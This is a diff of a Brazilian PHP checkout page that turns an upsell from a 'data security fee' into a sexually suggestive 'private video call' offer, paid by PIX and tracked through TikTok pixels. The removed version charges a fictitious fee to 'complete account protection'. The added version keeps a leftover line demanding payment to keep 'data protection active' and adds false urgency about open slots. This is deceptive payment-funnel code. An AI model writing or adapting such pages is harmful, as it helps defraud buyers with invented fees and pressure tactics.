@@ -108,13 +108,13 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </nav>
 
     <div id="ad1">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de segurança de dados</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Chamada de Vídeo Privada</p>
 
         <div class="ad1">
             <div style="margin-left: 3%; margin-right: 3%;">
                 <button class="styled-button">
                     <div class="icon-container" style="background-color: #f4f4f4; padding: 10px; border-radius: 50%;"> <!-- Mudança feita aqui -->
-                        <span class="material-symbols-outlined" style="font-size: 42px; color: #b42318;">shield_lock</span>
+                        <span class="material-symbols-outlined" style="font-size: 42px; color: #ff3d77;">videocam</span>
                     </div>
                     <span class="button-text">
                         <span class="button-title">Conta Privacy: #5972</span>
@@ -130,7 +130,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">check</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Pagamento principal confirmado</div>
+                            <div class="entrega-title">Pack de Estreia desbloqueado ✓</div>
                         </div>
                     </div>
                     <div class="entrega-content">
@@ -138,18 +138,18 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                             <span class="material-symbols-outlined">warning</span>
                         </div>
                         <div class="text-container">
-                            <div class="entrega-title">Taxa de segurança de dados pendente</div>
+                            <div class="entrega-title">Chamada de Vídeo Privada pronta pra agendar 💋</div>
                         </div>
                     </div>
                 </div>
 
-                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">Para concluir a proteção da conta, regularize a Taxa de Segurança de Dados.</p>
+                <p class="security-note" style="text-align: center; margin-left: 3%; margin-right: 3%;">💋 Você passou no Pack — agora vem comigo num nível mais íntimo. 10 minutos AO VIVO, frente a frente, só nós dois numa sala privada. Você manda, eu faço.</p>
                 <div style="text-align: center;"><span class="security-price"><small>Valor único</small><strong>R$ 12,89</strong></span></div>
 
                 <div class="button-container" style="padding-bottom: 20px;">
                     <button class="styled-button2" onclick="generatePixPayment(event)">
                         <span class="button-text">
-                            <span class="button-title2">Regularizar agora</span>
+                            <span class="button-title2">💋 Quero a chamada</span>
                         </span>
                         <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                     </button>
@@ -159,7 +159,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     </div>
 
     <div id="ad2" style="display: none;">
-        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Taxa de Segurança de Dados</p>
+        <p class="security-page-title" style="margin-left: 5%; font-size: 22px;">Chamada de Vídeo Privada</p>
 
         <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
             <div style="padding-top: 2px;"></div>
@@ -189,7 +189,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined">warning</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title">Taxa de segurança de dados ainda pendente.</div>
+                        <div class="entrega-title">Vaga ainda aberta — mas é por ordem de chegada 📹</div>
                     </div>
                 </div>
             </div>
@@ -204,7 +204,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                         <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
                     </div>
                     <div class="text-container">
-                        <div class="entrega-title" style="color: white">Para manter a proteção dos dados ativa, é necessário pagar a Taxa de Segurança de Dados. Valor único: R$ 12,89.</div>
+                        <div class="entrega-title" style="color: white">Para manter a proteção dos dados ativa, é necessário pagar a Chamada de Vídeo Privada. Valor único: R$ 12,89.</div>
                     </div>
                 </div>
             </div>
@@ -212,7 +212,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
                 <button onclick="generatePixPayment(event)" class="styled-button2">
                     <span class="button-text">
-                            <span class="button-title2">Pagar R$ 12,89</span>
+                            <span class="button-title2">💋 Liberar chamada por R$ 12,89</span>
                     </span>
                     <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
                 </button>
@@ -233,9 +233,9 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
     <script src="/tiktok-tracking.js"></script>
 
     <script>
-        document.body.dataset.step = "taxa_seguranca_dados";
+        document.body.dataset.step = "chamada_video";
 
-        // Sistema de PIX para taxa de seguranca de dados
+        // Sistema de PIX para Chamada de Video
         const PIX_API_BASES = (() => {
             const bases = [];
             const add = (base) => {
@@ -284,7 +284,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
 
         function postPixCreate(payload) {
             return fetchJsonFallback(
-                ["/pix-create.php", "/api/pix/create.php", "/api/pix/create", "/.netlify/functions/pix-create"],
+                ["/api/pix/create", "/api/pix/create.php", "/pix-create.php", "/.netlify/functions/pix-create"],
                 {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -298,7 +298,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             const encodedId = encodeURIComponent(paymentId);
             const query = identifier ? `?identifier=${encodeURIComponent(identifier)}` : "";
             return fetchJsonFallback(
-                [`/pix-status.php?id=${encodedId}`, `/api/pix/status.php?id=${encodedId}`, `/api/pix/${encodedId}${query}`],
+                [`/api/pix/${encodedId}${query}`, `/api/pix/status.php?id=${encodedId}`, `/pix-status.php?id=${encodedId}`],
                 {
                     method: "GET",
                     headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -371,12 +371,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     phone: "11999999999",
                     document: "12345678901"
                 };
-                console.log("👤 Dados do cliente para taxa de seguranca de dados:", clientData);
+                console.log("👤 Dados do cliente para Chamada de Video:", clientData);
 
-                // Dados para o PIX da taxa de seguranca de dados (formato NivusPay)
+                // Dados para o PIX da Chamada de Video (formato NivusPay)
                 const pixData = {
                     "amount": 12.89, // R$ 12,89
-                    "description": "Taxa de Segurança de Dados",
+                    "description": "Chamada de Vídeo Privada",
                     "paymentMethod": "pix",
                     "customer": {
                         "name": clientData.name,
@@ -389,21 +389,21 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     },
                     "items": [
                         {
-                            "title": "Taxa de Segurança de Dados",
+                            "title": "Chamada de Vídeo Privada",
                             "quantity": 1,
                             "unitPrice": 1289, // R$ 12,89 em centavos
                             "tangible": false,
-                            "externalRef": "taxa_seguranca_dados"
+                            "externalRef": "chamada_video"
                         }
                     ],
-                    "externalRef": "taxa_seguranca_dados_" + Date.now(),
-                    "external_id": "taxa_seguranca_dados_" + Date.now()
+                    "externalRef": "chamada_video_" + Date.now(),
+                    "external_id": "chamada_video_" + Date.now()
                 };
 
-                console.log("📦 Dados preparados para taxa de seguranca de dados:", pixData);
+                console.log("📦 Dados preparados para Chamada de Video:", pixData);
 
                 if (window.nicoleTikTok) {
-                    window.nicoleTikTok.trackCheckout({ content_id: "taxa_seguranca_dados", content_name: "Taxa de Seguranca de Dados", value: 12.89, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
+                    window.nicoleTikTok.trackCheckout({ content_id: "chamada_video", content_name: "Chamada de Video Privada", value: 12.89, order_id: pixData.external_id, event_id: "InitiateCheckout_" + pixData.external_id, customer: clientData });
                 }
 
                 const result = await postPixCreate(pixData);
@@ -414,7 +414,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                 const pixCode = normalizedPix.code;
 
                 if (transactionId && pixCode) {
-                    console.log("✅ PIX taxa de seguranca de dados gerado com sucesso");
+                    console.log("✅ PIX Chamada de Video gerado com sucesso");
 
                     // Mapear resposta NivusPay para formato esperado
                     const payment = {
@@ -431,10 +431,10 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     };
 
                     // Salvar ID da NivusPay para verificação posterior
-                    localStorage.setItem("nivuspay_transaction_id_taxa_seguranca_dados", transactionId);
+                    localStorage.setItem("nivuspay_transaction_id_chamada_video", transactionId);
 
                     if (window.nicoleTikTok) {
-                        window.nicoleTikTok.trackPixGenerated({ content_id: "taxa_seguranca_dados", content_name: "Taxa de Seguranca de Dados", value: 12.89, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
+                        window.nicoleTikTok.trackPixGenerated({ content_id: "chamada_video", content_name: "Chamada de Video Privada", value: 12.89, order_id: transactionId, event_id: "AddPaymentInfo_" + transactionId, customer: clientData });
                     }
 
                     showPixModal(payment);
@@ -464,7 +464,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     <div style="background:linear-gradient(135deg,#ff633d,#ff875e);color:#fff;text-align:center;padding:24px 22px 18px;">
                         <h2 style="font-size:20px;line-height:1.2;margin:0 0 6px;font-weight:800;color:#fff;">Escaneie o QR Code</h2>
                         <p style="font-size:15px;margin:0 0 9px;color:#fff;">Ou copie o código PIX abaixo</p>
-                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Taxa de Segurança de Dados - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '12,89'}</div>
+                        <div style="display:inline-flex;align-items:center;justify-content:center;min-height:26px;padding:4px 14px;border-radius:999px;background:rgba(255,255,255,.24);font-size:14px;font-weight:800;color:#fff;">Chamada de Vídeo Privada - R$ ${payment.amount ? payment.amount.toFixed(2).replace('.', ',') : '12,89'}</div>
                     </div>
                     <div style="padding:21px 20px 22px;">
                         <div id="qr-code-container" style="display:flex;justify-content:center;margin-bottom:13px;">
@@ -490,11 +490,11 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             paymentModal.classList.remove("hidden");
 
             // Salvar dados do PIX no localStorage
-            localStorage.setItem("currentPixTaxaSegurancaDados", JSON.stringify({
+            localStorage.setItem("currentPixChamadaVideo", JSON.stringify({
                 payment,
                 tracking: {
-                    content_id: "taxa_seguranca_dados",
-                    content_name: "Taxa de Seguranca de Dados",
+                    content_id: "chamada_video",
+                    content_name: "Chamada de Video Privada",
                     value: 12.89,
                     order_id: payment.payment_code,
                     event_id: "CompletePayment_" + payment.payment_code,
@@ -532,7 +532,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             qrContainer.innerHTML = '<div class="text-xs text-blue-500">Carregando QR Code...</div>';
 
             // Obter o código PIX do localStorage
-            const currentPix = localStorage.getItem('currentPixTaxaSegurancaDados');
+            const currentPix = localStorage.getItem('currentPixChamadaVideo');
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
                 return;
@@ -586,7 +586,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
 
         function showQRCodeFallback() {
             const qrContainer = document.getElementById('qrcode');
-            const currentPix = localStorage.getItem('currentPixTaxaSegurancaDados');
+            const currentPix = localStorage.getItem('currentPixChamadaVideo');
             
             if (!currentPix) {
                 qrContainer.innerHTML = '<div class="text-xs text-red-500">Dados PIX não encontrados</div>';
@@ -680,7 +680,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         let paymentCheckInterval = null;
         
         function startAutomaticPaymentCheck(paymentCode) {
-            console.log("🔄 Iniciando verificação automática do pagamento da taxa de seguranca de dados...");
+            console.log("🔄 Iniciando verificação automática do pagamento da Chamada de Video...");
             
             // Verificar a cada 10 segundos
             paymentCheckInterval = setInterval(async () => {
@@ -710,12 +710,12 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
         
         // Função interna para verificar status (usada tanto pelo automático quanto pelo botão)
         async function checkPaymentStatusInternal(paymentCode, isAutomatic = false) {
-            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_taxa_seguranca_dados") || paymentCode;
+            const nivuspayId = localStorage.getItem("nivuspay_transaction_id_chamada_video") || paymentCode;
             
-            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da taxa de seguranca de dados:`, nivuspayId);
+            console.log(`🔍 ${isAutomatic ? 'Verificação automática' : 'Verificação manual'} do pagamento da Chamada de Video:`, nivuspayId);
             
             // Buscar o identifier do localStorage se disponível
-            const currentPix = localStorage.getItem("currentPixTaxaSegurancaDados");
+            const currentPix = localStorage.getItem("currentPixChamadaVideo");
             let identifier = '';
             if (currentPix) {
                 const pixData = JSON.parse(currentPix);
@@ -723,14 +723,14 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
             }
             
             const result = await getPixStatus(nivuspayId, identifier);
-            console.log("📊 Status da transação da taxa de seguranca de dados:", result);
+            console.log("📊 Status da transação da Chamada de Video:", result);
 
             // Verificar se o pagamento foi confirmado
             const statusRaw = String(result.status || result.data?.status || "").toUpperCase();
             const isPaid = result.isPaid === true || result.paid === true || ["PAID", "APPROVED", "CONFIRMED", "COMPLETED"].includes(statusRaw);
 
             if (isPaid) {
-                console.log("✅ Pagamento da taxa de seguranca de dados confirmado!");
+                console.log("✅ Pagamento da Chamada de Video confirmado!");
                 
                 // Parar verificação automática
                 stopAutomaticPaymentCheck();
@@ -738,10 +738,10 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                     const paidEventId = "CompletePayment_" + nivuspayId;
                     let paidCustomer = {};
                     try {
-                        const paidPix = JSON.parse(localStorage.getItem("currentPixTaxaSegurancaDados") || "{}");
+                        const paidPix = JSON.parse(localStorage.getItem("currentPixChamadaVideo") || "{}");
                         paidCustomer = (paidPix && paidPix.payment && paidPix.payment.customer) || {};
                     } catch (error) {}
-                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "taxa_seguranca_dados", content_name: "Taxa de Seguranca de Dados", value: 12.89, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
+                    window.nicoleTikTok.trackPaymentConfirmed({ content_id: "chamada_video", content_name: "Chamada de Video Privada", value: 12.89, order_id: nivuspayId, event_id: paidEventId, customer: paidCustomer });
                 }
                 
                 // Redirecionar para up2 pm
@@ -749,7 +749,7 @@ if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionT
                 return;
             } else {
                 const status = result.status || 'unknown';
-                console.log(`⏳ Status atual da taxa de seguranca de dados: ${status}`);
+                console.log(`⏳ Status atual da Chamada de Video: ${status}`);
                 
                 // Se não for automático, mostrar mensagem para o usuário
                 if (!isAutomatic) {
